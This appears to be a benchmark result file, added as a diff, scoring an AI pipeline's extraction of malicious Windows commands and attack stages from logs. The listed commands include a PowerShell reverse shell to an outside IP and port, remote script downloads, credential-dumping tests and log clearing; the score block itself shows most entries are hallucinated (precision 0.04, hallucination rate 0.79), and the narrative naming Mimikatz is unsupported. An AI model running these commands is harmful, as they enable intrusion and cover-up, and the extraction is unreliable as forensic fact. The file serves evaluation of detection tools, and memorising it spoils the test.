@@ -1,0 +1,144 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\timestomp.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1003.003",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powercfg.exe /lastwake",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powercfg.exe /energy",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powercfg.exe /batteryreport",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\atomic-red-team-master\\modules\\ad_migrate\\migrate.ps1",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Create-Token",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\atomic-red-team-master\\tools\\misc\\taint_envvars.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\atomic-red-team-master\\tools\\privilege\\winXP_sploit.ps1",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\atomic-red-team-master\\tools\\drivers\\sysdig.ps1",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddress 124.223.85.207 -Port 8082",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-UriDownload -URI http://192.168.1.100/script.ps1 -Destination C:\\Windows\\Temp\\script.ps1",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1003.004",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\atomic-red-team-master\\tools\\misc\\get_hosts.ps1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\atomic-red-team-master\\tools\\misc\\get_exports.ps1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\atomic-red-team-master\\tools\\misc\\get_serviceaccounts.ps1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\atomic-red-team-master\\tools\\misc\\get_shell_history.ps1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "rundll32.exe twain_32.dll,DllRegisterServer",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\path\\to\\file.bat",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c start C:\\Windows\\System32\\cmd.exe /c powershell.exe -ExecutionPolicy Bypass -Command \\path\\to\\ script.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\atomic-red-team-master\\tools\\driver\\inject_driver.ps1",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\path\\to\\payload.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\atomic-red-team-master\\tools\\misc\\powershell_log_overwrite.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\atomic-red-team-master\\tools\\misc\\powershell_log_clear.ps1",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The attacker exploited multiple vulnerabilities in various systems to gain persistence and execute commands remotely. They leveraged PowerShell scripts to evade defenses and access sensitive information. The attacker used tools such as Mimikatz and AtomicRedTeam to gather data and maintain control over the systems.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 236378,
+      "completion_tokens": 2271,
+      "total_tokens": 238649,
+      "wall_clock_s": 57.223,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.04,
+      "recall": 0.07142857142857142,
+      "f1": 0.05128205128205128,
+      "tp": 1,
+      "fp": 24,
+      "fn": 13
+    },
+    "stage": {
+      "precision": 0.04,
+      "recall": 0.07142857142857142,
+      "f1": 0.05128205128205128,
+      "tp": 1,
+      "fp": 24,
+      "fn": 13,
+      "recall_partial": 0.07142857142857142
+    },
+    "hallucination_rate": 0.7916666666666666,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 236378,
+      "completion_tokens": 2271,
+      "total_tokens": 238649,
+      "wall_clock_s": 57.223,
+      "parse_retries": 0
+    }
+  }
+}
